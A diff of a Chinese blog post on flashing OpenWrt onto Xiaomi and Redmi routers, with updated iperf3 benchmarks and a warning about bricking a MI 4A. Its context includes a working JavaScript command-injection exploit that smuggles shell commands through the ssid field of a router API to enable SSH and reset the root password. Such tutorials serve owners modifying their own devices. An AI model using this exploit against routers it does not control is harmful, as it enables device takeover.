@@ -34,7 +34,7 @@
 <meta property="og:image" content="https://raw.githubusercontent.com/TheRainstorm/.image-bed/main/picgo/image-20220802134945115.png">
 <meta property="og:image" content="https://raw.githubusercontent.com/TheRainstorm/.image-bed/main/picgo/image-20220802142756560.png">
 <meta property="article:published_time" content="2022-02-12T17:18:16.000Z">
-<meta property="article:modified_time" content="2022-10-31T08:53:19.869Z">
+<meta property="article:modified_time" content="2022-11-06T15:09:19.490Z">
 <meta property="article:author" content="rain">
 <meta property="article:tag" content="折腾">
 <meta property="article:tag" content="如何实现网络自由">
@@ -130,12 +130,12 @@
   </li>
         <li class="menu-item menu-item-tags">
 
-    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>Tags<span class="badge">12</span></a>
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>Tags<span class="badge">16</span></a>
 
   </li>
         <li class="menu-item menu-item-archives">
 
-    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>Archives<span class="badge">48</span></a>
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>Archives<span class="badge">49</span></a>
 
   </li>
   </ul>
@@ -196,7 +196,7 @@
                   <i class="fa fa-calendar-check-o"></i>
                 </span>
                 <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2022-10-31 16:53:19" itemprop="dateModified" datetime="2022-10-31T16:53:19+08:00">2022-10-31</time>
+                <time title="Modified: 2022-11-06 23:09:19" itemprop="dateModified" datetime="2022-11-06T23:09:19+08:00">2022-11-06</time>
               </span>
 
           
@@ -392,59 +392,92 @@
 <ul>
 <li><a href="https://github.com/TheRainstorm/my-openwrt-config" target="_blank" rel="noopener">TheRainstorm/my-openwrt-config (github.com)</a></li>
 </ul>
-<h3 id="性能测试"><a href="#性能测试" class="headerlink" title="性能测试"></a>性能测试</h3><h4 id="iperf3"><a href="#iperf3" class="headerlink" title="iperf3"></a>iperf3</h4><table>
+<h3 id="性能测试"><a href="#性能测试" class="headerlink" title="性能测试"></a>性能测试</h3><h4 id="iperf3"><a href="#iperf3" class="headerlink" title="iperf3"></a>iperf3</h4><p>ax6s &amp; mi4a</p>
+<table>
 <thead>
 <tr>
-<th>说明</th>
+<th>测试目的</th>
 <th>连接</th>
 <th>src</th>
 <th>dst</th>
 <th>speed(Mb/s)</th>
+<th>备注</th>
 </tr>
 </thead>
 <tbody><tr>
-<td>ax6s LAN2LAN</td>
+<td>ax6s LAN性能</td>
 <td>千兆USB网卡</td>
 <td>tianyi310</td>
 <td>ax6s</td>
-<td>941</td>
+<td><strong>941</strong></td>
+<td></td>
 </tr>
 <tr>
-<td>ax6s wifi</td>
+<td>ax6s 无线性能</td>
 <td>wifi6 5Ghz@1201</td>
 <td>s3pro</td>
 <td>ax6s</td>
-<td>626</td>
+<td><strong>626</strong></td>
+<td></td>
 </tr>
 <tr>
-<td>r4a LAN2LAN</td>
+<td>mi4a LAN性能</td>
 <td>2.5G网卡</td>
 <td>ryzen</td>
-<td>r4a</td>
-<td>470</td>
+<td>mi4a</td>
+<td><strong><em>470</em></strong></td>
+<td></td>
 </tr>
 <tr>
-<td>r4a-ax6s vpn2vpn</td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>隧道性能</td>
 <td></td>
 <td>tianyi310</td>
 <td>ryzen</td>
 <td>118</td>
+<td></td>
 </tr>
 <tr>
-<td>r4a to ax6s</td>
 <td></td>
-<td>r4a</td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>隧道性能</td>
+<td></td>
+<td>mi4a</td>
 <td>ax6s</td>
 <td>136</td>
+<td></td>
 </tr>
 <tr>
-<td>ax6s to r4a</td>
+<td></td>
 <td></td>
 <td>ax6s</td>
-<td>r4a</td>
+<td>mi4a</td>
 <td>149</td>
+<td></td>
+</tr>
+<tr>
+<td>mi4a交换性能</td>
+<td>ryzen - mi4a - p2w</td>
+<td>ryzen</td>
+<td>p2w</td>
+<td><strong>943</strong></td>
+<td>结果居然比ryzen - mi4a还要快！</td>
 </tr>
 </tbody></table>
+<p>将r4a替换掉后<br>| 测试目的 | src       | dst       | speed(Mb/s) | 备注 |<br>| ——– | ——— | ——— | ———– | —- |<br>| p2w      | ryzen     | p2w       | <strong>936</strong>     |      |<br>|          | p2w       | ryzen     | <strong><em>577</em></strong>   |      |<br>| 隧道性能 | p2w       | ax6s      | 150         |      |<br>|          | ax6s      | p2w       | 250         |      |<br>| 隧道性能 | ryzen     | tianyi310 | <strong>295</strong>     |      |<br>|          | tianyi310 | ryzen     | <strong>173</strong>     |      |<br>|          | s3pro     | ryzen     | 256         |      |<br>| 780/886  | s3pro     | p2w       | <strong>370</strong>     |      |<br>|          | ryzen     | s3pro     | 274         |      |</p>
 <h2 id="具体型号刷机过程"><a href="#具体型号刷机过程" class="headerlink" title="具体型号刷机过程"></a>具体型号刷机过程</h2><h3 id="Redmi-AC2100刷Openwrt"><a href="#Redmi-AC2100刷Openwrt" class="headerlink" title="Redmi AC2100刷Openwrt"></a>Redmi AC2100刷Openwrt</h3><h4 id="1-确认stock系统版本"><a href="#1-确认stock系统版本" class="headerlink" title="1. 确认stock系统版本"></a>1. 确认stock系统版本</h4><p>确认系统版本是否为2.0.23，如果不是，则在系统内手动升级到该版本<a href="http://cdn.cnbj1.fds.api.mi-img.com/xiaoqiang/rom/rm2100/miwifi_rm2100_all_fb720_2.0.23.bin" target="_blank" rel="noopener">http://cdn.cnbj1.fds.api.mi-img.com/xiaoqiang/rom/rm2100/miwifi_rm2100_all_fb720_2.0.23.bin</a></p>
 <h4 id="2-获得ssh"><a href="#2-获得ssh" class="headerlink" title="2. 获得ssh"></a>2. 获得ssh</h4><p>使用web漏洞，获得ssh</p>
 <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Work for RedMi 2100 firmware 2.0.23</span></span><br><span class="line"><span class="comment">// http://cdn.cnbj1.fds.api.mi-img.com/xiaoqiang/rom/rm2100/miwifi_rm2100_all_fb720_2.0.23.bin</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getSTOK</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> match = location.href.match(<span class="regexp">/;stok=(.*?)\//</span>);</span><br><span class="line">    <span class="keyword">if</span> (!match) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> match[<span class="number">1</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">execute</span>(<span class="params">stok, command</span>) </span>&#123;</span><br><span class="line">    command = <span class="built_in">encodeURIComponent</span>(command);</span><br><span class="line">    <span class="keyword">let</span> path = <span class="string">`/cgi-bin/luci/;stok=<span class="subst">$&#123;stok&#125;</span>/api/misystem/set_config_iotdev?bssid=SteelyWing&amp;user_id=SteelyWing&amp;ssid=-h%0A<span class="subst">$&#123;command&#125;</span>%0A`</span>;</span><br><span class="line">    <span class="built_in">console</span>.log(path);</span><br><span class="line">    <span class="keyword">return</span> fetch(<span class="keyword">new</span> Request(location.origin + path));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">enableSSH</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    stok = getSTOK();</span><br><span class="line">    <span class="keyword">if</span> (!stok) &#123;</span><br><span class="line">        <span class="built_in">console</span>.error(<span class="string">'stok not found in URL'</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">`stok = "<span class="subst">$&#123;stok&#125;</span>"`</span>);</span><br><span class="line"></span><br><span class="line">    password = prompt(<span class="string">'Input new SSH password'</span>);</span><br><span class="line">    <span class="keyword">if</span> (!password) &#123;</span><br><span class="line">        <span class="built_in">console</span>.error(<span class="string">'You must input password'</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    execute(stok, </span><br><span class="line"><span class="string">`</span></span><br><span class="line"><span class="string">nvram set ssh_en=1</span></span><br><span class="line"><span class="string">nvram commit</span></span><br><span class="line"><span class="string">sed -i 's/channel=.*/channel=\\"debug\\"/g' /etc/init.d/dropbear</span></span><br><span class="line"><span class="string">/etc/init.d/dropbear start</span></span><br><span class="line"><span class="string">`</span></span><br><span class="line">    )</span><br><span class="line">        .then(<span class="function">(<span class="params">response</span>) =&gt;</span> response.text())</span><br><span class="line">        .then(<span class="function">(<span class="params">text</span>) =&gt;</span> <span class="built_in">console</span>.log(text));</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'New SSH password: '</span> + password);</span><br><span class="line">    execute(stok, <span class="string">`echo -e "<span class="subst">$&#123;password&#125;</span>\\n<span class="subst">$&#123;password&#125;</span>" | passwd root`</span>)</span><br><span class="line">        .then(<span class="function">(<span class="params">response</span>) =&gt;</span> response.text())</span><br><span class="line">        .then(<span class="function">(<span class="params">text</span>) =&gt;</span> <span class="built_in">console</span>.log(text));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">enableSSH();</span><br></pre></td></tr></table></figure>
@@ -476,6 +509,7 @@
 <h4 id="6-刷机"><a href="#6-刷机" class="headerlink" title="6. 刷机"></a>6. 刷机</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mtd write kernel1.bin kernel1</span><br><span class="line">mtd -r write rootfs0.bin rootfs0</span><br></pre></td></tr></table></figure>
 
 <h3 id="MI-4A千兆版"><a href="#MI-4A千兆版" class="headerlink" title="MI 4A千兆版"></a>MI 4A千兆版</h3><h4 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h4><p>可以漏洞获取shell，不必使用硬件编程器</p>
+<p>2022/11/6日，因刷breed bootloader，使得MI 4A变砖。忠告：别用breed，会变得不幸。（你tm支持r3g，不支持mi 4a能不能写清楚）</p>
 <h4 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h4><ol>
 <li><p>首先需要使用<code>OpenWRTInvasion</code><strong>获取shell</strong>。参考：<a href="https://github.com/acecilia/OpenWRTInvasion" target="_blank" rel="noopener">acecilia/OpenWRTInvasion(github.com)</a>。</p>
 <p>同时，该仓库也提供了获得shell后的刷机过程。</p>
@@ -490,7 +524,7 @@
 </ol>
 <h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p>breed使用说明：<a href="https://www.sohu.com/a/304140654_120096961" target="_blank" rel="noopener">https://www.sohu.com/a/304140654_120096961</a></p>
 <p>breed刷openwrt教程<a href="https://www.ixigua.com/6974624328725824031" target="_blank" rel="noopener">https://www.ixigua.com/6974624328725824031</a></p>
-<h3 id="MI-R3G"><a href="#MI-R3G" class="headerlink" title="MI R3G"></a>MI R3G</h3><p>官方教程：<a href="https://openwrt.org/toh/xiaomi/mir3g" target="_blank" rel="noopener">[OpenWrt Wiki] Xiaomi Mi WiFi R3G (Mi Wifi Router 3G / MIR3G / MI3G / R4A Gigabit)</a></p>
+<h3 id="MI-R3G"><a href="#MI-R3G" class="headerlink" title="MI R3G"></a>MI R3G</h3><p>官方教程：<a href="https://openwrt.org/toh/xiaomi/mir3g" target="_blank" rel="noopener">[OpenWrt Wiki] Xiaomi Mi WiFi R3G (Mi Wifi Router 3G / MIR3G / MI3G / mi4a Gigabit)</a></p>
 <p>r3g官方固件下载：<a href="https://firmware-selector.openwrt.org/?version=21.02.3&target=ramips%2Fmt7621&id=xiaomi_mi-router-3g">OpenWrt Firmware Selector</a></p>
 <h4 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h4><ul>
 <li>FAT32格式U盘</li>
@@ -547,7 +581,7 @@
 
 <p><img src="https://raw.githubusercontent.com/TheRainstorm/.image-bed/main/picgo/image-20220802142756560.png" alt="image-20220802142756560"></p>
 <h3 id="竞斗云2-0"><a href="#竞斗云2-0" class="headerlink" title="竞斗云2.0"></a>竞斗云2.0</h3><p>需要先刷入opboot（一个第三方bootloader）<a href="https://www.red-yellow.net/竞斗云2刷opboot.html" target="_blank" rel="noopener">竞斗云2刷opboot - 路由智态 (red-yellow.net)</a></p>
-<p>然后再刷openwrt。</p>
+<p>然后再刷openwrt。<br>编译：<a href="https://www.red-yellow.net/%e7%ab%9e%e6%96%97%e4%ba%912%e7%9a%84openwrt%e5%9b%ba%e4%bb%b6.html" target="_blank" rel="noopener">竞斗云2的OpenWrt固件 - 路由智态 (red-yellow.net)</a></p>
 <p>比较担心opboot和opewrt最新版的兼容性。</p>
 
     </div>
@@ -569,12 +603,12 @@
         
     <div class="post-nav">
       <div class="post-nav-item">
-    <a href="/2022/02/13/openwrt%E7%BC%96%E8%AF%91/" rel="prev" title="openwrt编译">
-      <i class="fa fa-chevron-left"></i> openwrt编译
+    <a href="/2022/02/13/openwrt%E9%85%8D%E7%BD%AE/" rel="prev" title="openwrt配置">
+      <i class="fa fa-chevron-left"></i> openwrt配置
     </a></div>
       <div class="post-nav-item">
-    <a href="/2022/02/14/%E5%A6%82%E4%BD%95%E5%AE%9E%E7%8E%B0%E7%BD%91%E7%BB%9C%E8%87%AA%E7%94%B1/" rel="next" title="如何实现网络自由">
-      如何实现网络自由 <i class="fa fa-chevron-right"></i>
+    <a href="/2022/02/13/openwrt%E7%BC%96%E8%AF%91/" rel="next" title="openwrt编译">
+      openwrt编译 <i class="fa fa-chevron-right"></i>
     </a></div>
     </div>
       </footer>
@@ -651,14 +685,14 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">48</span>
+          <span class="site-state-item-count">49</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">12</span>
+        <span class="site-state-item-count">16</span>
         <span class="site-state-item-name">tags</span></a>
       </div>
   </nav>
